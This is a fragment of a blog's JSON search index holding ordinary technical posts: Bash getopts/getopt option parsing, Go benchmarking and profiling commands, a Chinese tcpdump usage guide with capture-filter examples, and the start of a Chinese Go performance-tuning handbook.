style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e in\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    a\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Processing option \u0026#39;a\u0026#39;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      ;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    b\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Processing option \u0026#39;b\u0026#39;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      ;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    c\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      arg\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$OPTARG\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Processing option \u0026#39;c\u0026#39; with \u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eOPTARG\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39; argument\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      ;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    h\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Usage: \u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003ebasename $0\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e [-a] [-b] [-c arg]\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      exit \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      ;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    :\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      echo -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;option requires an argument.\\nUsage: \u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003ebasename $0\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e [-a] [-b] [-c arg]\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      exit \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      ;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    ?\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      echo -e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Invalid command option.\\nUsage: \u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003ebasename $0\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e [-a] [-b] [-c arg]\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      exit \u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e      ;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eesac\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eshift \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$((\u003c/span\u003e$OPTIND \u003cspan style=\"color:#f92672\"\u003e-\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e))\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003eNote that we\u0026rsquo;ve updated optstring as well. Now it starts with the colon(:) character, which suppresses the default error message.\u003c/li\u003e\n\u003cli\u003eThe getopts function disables error reporting when the OPTERR variable is set to zero.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"parsing-long-command-line-options-with-getopt\"\u003eParsing Long Command-Line Options With getopt\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e#!/bin/bash\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eVALID_ARGS\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003egetopt -o abg:d: --long alpha,beta,gamma:,delta: -- \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$@\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[[\u003c/span\u003e $? -ne \u003cspan style=\"color:#ae81ff\"\u003e0\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e]]\u003c/span\u003e; \u003cspan style=\"color:#66d9ef\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    exit 1;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eeval set -- \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$VALID_ARGS\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003ewhile\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e : \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e; \u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003ecase\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$1\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e in\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    -a | --alpha\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Processing \u0026#39;alpha\u0026#39; option\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        shift\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        ;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    -b | --beta\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Processing \u0026#39;beta\u0026#39; option\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        shift\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        ;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    -g | --gamma\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Processing \u0026#39;gamma\u0026#39; option. Input argument is \u0026#39;\u003c/span\u003e$2\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        shift \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        ;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    -d | --delta\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        echo \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Processing \u0026#39;delta\u0026#39; option. Input argument is \u0026#39;\u003c/span\u003e$2\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        shift \u003cspan style=\"color:#ae81ff\"\u003e2\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        ;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    --\u003cspan style=\"color:#f92672\"\u003e)\u003c/span\u003e shift;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        break\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        ;;\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eesac\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e-o\u003c/code\u003e option represents the short command-line options\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e--long\u003c/code\u003e option represents the long command-line options\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Linux","BASH"],"title":"Parse Command Line Arguments in Bash"},{"categories":["URL","Go"],"contents":" Go code refactoring : the 23x performance hunt $ go test -bench=. -cpuprofile cpu.prof $ go tool pprof -svg cpu.prof \u0026gt; cpu.svg $ go test -bench=. -trace trace.out $ go tool trace trace.out ","date":"June 7, 2022","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20220607-go-code-refactoring-the-23x-performance-hunt/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://medium.com/@val_deleplace/go-code-refactoring-the-23x-performance-hunt-156746b522f7\" target=\"_blank\" rel=\"noopener\"\u003eGo code refactoring : the 23x performance hunt\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ go test -bench\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e. -cpuprofile cpu.prof\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ go tool pprof -svg cpu.prof \u0026gt; cpu.svg\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ go test -bench\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e. -trace trace.out\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e$ go tool trace trace.out\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Go"],"title":"Go code refactoring : the 23x performance hunt"},{"categories":["URL","Go","Testing"],"contents":" Dockertest 极速搭建集成测试环境神器 dockertest ","date":"May 12, 2022","hero":"/images/hero/go.svg","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20220512-dockertest/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://cn-sec.com/archives/998286.html\" target=\"_blank\" rel=\"noopener\"\u003eDockertest 极速搭建集成测试环境神器\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"https://github.com/ory/dockertest\" target=\"_blank\" rel=\"noopener\"\u003edockertest\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e","tags":["URL","Go","Testing"],"title":"Dockertest 极速搭建集成测试环境神器"},{"categories":["URL","Network","tcpdump","command line"],"contents":" Tcpdump 使用总结 命令使用 tcpdump 采用命令行方式，它的命令格式为：\ntcpdump [ -AdDeflLnNOpqRStuUvxX ] [ -c count ] [ -C file_size ] [ -F file ] [ -i interface ] [ -m module ] [ -M secret ] [ -r file ] [ -s snaplen ] [ -T type ] [ -w file ] [ -W filecount ] [ -E spi@ipaddr algo:secret, ... ] [ -y datalinktype ] [ -Z user ] [ expression ] tcpdump 的简单选项介绍 -E spi@ipaddr algo:secret , ...，可通过spi@ipaddr algo:secret 来解密 IPsec ESP 包。secret 为用于 ESP 的密钥，使用 ASCII 字符串方式表达。 如果以 0x 开头，该密钥将以 16 进制方式读入。 除了以上的语法格式(指spi@ipaddr algo:secret)， 还可以在后面添加一个语法输入文件名字供 tcpdump 使用(即把 spi@ipaddr algo:secret, … 中…换成一个语法文件名)。 在接收到第一个 ESP 包时会打开此文件， 所以最好此时把赋予 tcpdump 的一些特权取消(可理解为，这样防范之后，当该文件为恶意编写时，不至于造成过大损害)。 -T type 强制 tcpdump 按 type 指定的协议所描述的包结构来分析收到的数据包。 目前已知的 type 可取的协议为: aodv (Ad-hoc On-demand Distance Vector protocol， 按需距离向量路由协议，在 Ad hoc(点对点模式)网络中使用)， cnfp (Cisco NetFlow protocol) rpc(Remote Procedure Call) rtp (Real-Time Applications protocol) rtcp (Real-Time Applications con-trol protocol) snmp (Simple Network Management Protocol) tftp (Trivial File Transfer Protocol， 碎文件协议) vat (Visual Audio Tool， 可用于在 internet 上进行电视电话会议的应用层协议) wb (distributed White Board， 可用于网络会议的应用层协议) 实用命令实例 截获主机 210.27.48.1 和主机 210.27.48.2 或 210.27.48.3 的通信\ntcpdump host 210.27.48.1 and \\( 210.27.48.2 or 210.27.48.3 \\) 监视所有送到主机 hostname 的数据包\ntcpdump -i eth0 dst host hostname 获取主机 210.27.48.1 接收或发出的 telnet 包\ntcpdump tcp port 23 and host 210.27.48.1 打印 TCP 会话中的的开始和结束数据包, 并且数据包的源或目的不是本地网络上的主机.(nt: localnet, 实际使用时要真正替换成本地网络的名字)\ntcpdump 'tcp[tcpflags] \u0026amp; (tcp-syn|tcp-fin) != 0 and not src and dst net localnet' 打印所有源或目的端口是 80, 网络层协议为 IPv4, 并且含有数据,而不是 SYN,FIN 以及 ACK-only 等不含数据的数据包\ntcpdump 'tcp port 80 and (((ip[2:2] - ((ip[0]\u0026amp;0xf)\u0026lt;\u0026lt;2)) - ((tcp[12]\u0026amp;0xf0)\u0026gt;\u0026gt;2)) != 0)' (可理解为, ip[2:2]表示整个 ip 数据包的长度, (ip[0]\u0026amp;0xf)«2)表示 ip 数据包包头的长度(ip[0]\u0026amp;0xf 代表包中的 IHL 域, 而此域的单位为 32bit, 要换算成字节数需要乘以 4,　即左移 2.　(tcp[12]\u0026amp;0xf0)»4 表示 tcp 头的长度, 此域的单位也是 32bit,　换算成比特数为 ((tcp[12]\u0026amp;0xf0) » 4)　«　２,　即 ((tcp[12]\u0026amp;0xf0)»2).　((ip[2:2] - ((ip[0]\u0026amp;0xf)«2)) - ((tcp[12]\u0026amp;0xf0)»2)) != 0 表示:整个 ip 数据包的长度减去 ip 头的长度,再减去 tcp 头的长度不为 0, 这就意味着,ip 数据包中确实是有数据.对于 ipv6 版本只需考虑 ipv6 头中的\u0026rsquo;Payload Length\u0026rsquo; 与 \u0026rsquo;tcp 头的长度\u0026rsquo;的差值, 并且其中表达方式\u0026rsquo;ip[]\u0026lsquo;需换成\u0026rsquo;ip6[]\u0026rsquo;.)\n抓取 HTTP 包\ntcpdump -XvvennSs 0 -i eth0 tcp[20:2]=0x4745 or tcp[20:2]=0x4854 0x4745 为\u0026quot;GET\u0026quot;前两个字母\u0026quot;GE\u0026quot;,0x4854 为\u0026quot;HTTP\u0026quot;前两个字母\u0026quot;HT\u0026quot;。\n","date":"May 5, 2022","hero":"/images/hero/network.png","permalink":"https://linzeyan.github.io/zh-tw/posts/2022/20220505-tcpdump/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://markrepo.github.io/commands/2018/06/23/tcpdump/\" target=\"_blank\" rel=\"noopener\"\u003eTcpdump 使用总结\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"命令使用\"\u003e命令使用\u003c/h2\u003e\n\u003cp\u003etcpdump 采用命令行方式，它的命令格式为：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etcpdump \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -AdDeflLnNOpqRStuUvxX \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -c count \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e           \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -C file_size \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -F file \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e           \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -i interface \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -m module \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -M secret \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e           \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -r file \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -s snaplen \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -T type \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -w file \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e           \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -W filecount \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e           \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -E spi@ipaddr algo:secret, ...  \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e           \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -y datalinktype \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e -Z user \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e           \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003e expression \u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"tcpdump-的简单选项介绍\"\u003etcpdump 的简单选项介绍\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003e-E spi@ipaddr algo:secret , ...\u003c/code\u003e，可通过\u003ccode\u003espi@ipaddr algo:secret\u003c/code\u003e 来解密 IPsec ESP 包。secret 为用于 ESP 的密钥，使用 ASCII 字符串方式表达。 如果以 \u003ccode\u003e0x\u003c/code\u003e 开头，该密钥将以 16 进制方式读入。 除了以上的语法格式(指\u003ccode\u003espi@ipaddr algo:secret\u003c/code\u003e)， 还可以在后面添加一个语法输入文件名字供 tcpdump 使用(即把 spi@ipaddr algo:secret, … 中…换成一个语法文件名)。 在接收到第一个 ESP 包时会打开此文件， 所以最好此时把赋予 tcpdump 的一些特权取消(可理解为，这样防范之后，当该文件为恶意编写时，不至于造成过大损害)。\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e-T type\u003c/code\u003e 强制 tcpdump 按 type 指定的协议所描述的包结构来分析收到的数据包。 目前已知的 type 可取的协议为:\n\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eaodv\u003c/code\u003e (Ad-hoc On-demand Distance Vector protocol， 按需距离向量路由协议，在 Ad hoc(点对点模式)网络中使用)，\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ecnfp\u003c/code\u003e (Cisco NetFlow protocol)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003erpc\u003c/code\u003e(Remote Procedure Call)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ertp\u003c/code\u003e (Real-Time Applications protocol)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ertcp\u003c/code\u003e (Real-Time Applications con-trol protocol)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003esnmp\u003c/code\u003e (Simple Network Management Protocol)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003etftp\u003c/code\u003e (Trivial File Transfer Protocol， 碎文件协议)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003evat\u003c/code\u003e (Visual Audio Tool， 可用于在 internet 上进行电视电话会议的应用层协议)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ewb\u003c/code\u003e (distributed White Board， 可用于网络会议的应用层协议)\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"实用命令实例\"\u003e实用命令实例\u003c/h3\u003e\n\u003cp\u003e\u003cstrong\u003e截获主机 210.27.48.1 和主机 210.27.48.2 或 210.27.48.3 的通信\u003c/strong\u003e\u003c/p\u003e","tags":["URL","Network","tcpdump","command line"],"title":"Tcpdump 使用总结"},{"categories":["URL","Go"],"contents":" Go 语言高性能编程手册（万字长文） 常用数据结构 反射虽好，切莫贪杯\n优先使用 strconv 而不是 fmt 少量的重复不比反射差 慎用 binary.Read 和 binary.Write binary.Read 和 binary.Write 使用反射并且很慢。如果有需要用到这两个函数的地方，我们应该手动实现这两个函数的相关功能，而不是直接去使用它们。 避免重复的字符串到字节切片的转换\n指定容器(slice/map)容量\n字符串拼接方式\n行内拼接字符串推荐使用运算符 + 非行内拼接字符串推荐使用 strings.Builder 遍历 []struct{} 使用下标而不是 range\n两种通过 index 遍历 []struct 性能没有差别，但是 range 遍历 []struct 中元素时，性能非常差。\nrange 遍历 []*struct 中元素时，與下标性能没有差别。\n内存管理 使用空结构体节省内存\nstruct 布局要考虑内存对齐\nCPU 访问内存时，并不是逐个字节访问，而是以字长（word size）为单位访问。比如 32 位的 CPU ，字长为 4 字节，那么 CPU 访问内存的单位也是 4 字节。 这么设计的目的，是减少 CPU 访问内存的次数，加大 CPU 访问内存的吞吐量。比如同样读取 8 个字节的数据，一次读取 4 个字节那么只需要读取 2 次。\n减少逃逸，将变量限制在栈上\n变量逃逸一般发生在如下几种情况： 变量较大 变量大小不确定 变量类型不确定 返回指针 返回引用 闭包 小的拷贝好过引用 一般是 \u0026lt;64KB，局部变量将不会逃逸到堆上。 返回值 VS 返回指针 值传递会拷贝整个对象，而指针传递只会拷贝地址，指向的对象是同一个。返回指针可以减少值的拷贝，但是会导致内存分配逃逸到堆中，增加垃圾回收（GC）的负担。在对象频繁创建和删除的场景下，传递指针导致的 GC 开销可能会严重影响性能。 一般情况下，对于需要修改原对象值，或占用内存比较大的结构体，选择返回指针。对于只读的占用内存较小的结构体，直接返回值能够获得更好的性能。 返回值使用确定的类型 如果变量类型不确定，那么将会逃逸到堆上。所以，函数返回值如果能确定的类型，就不要使用 interface{}。 sync.Pool 复用对象\nsync.Pool 是可伸缩的，同时也是并发安全的，其容量仅受限于内存的大小。存放在池中的对象如果不活跃了会被自动清理。\n对于很多需要重复分配、回收内存的地方，sync.Pool 是一个很好的选择。频繁地分配、回收内存会给 GC 带来一定的负担，严重的时候会引起 CPU 的毛刺，而 sync.Pool 可以将暂时不用的对象缓存起来，待下次需要的时候直接使用，不用再次经过内存分配，复用对象的内存，减轻 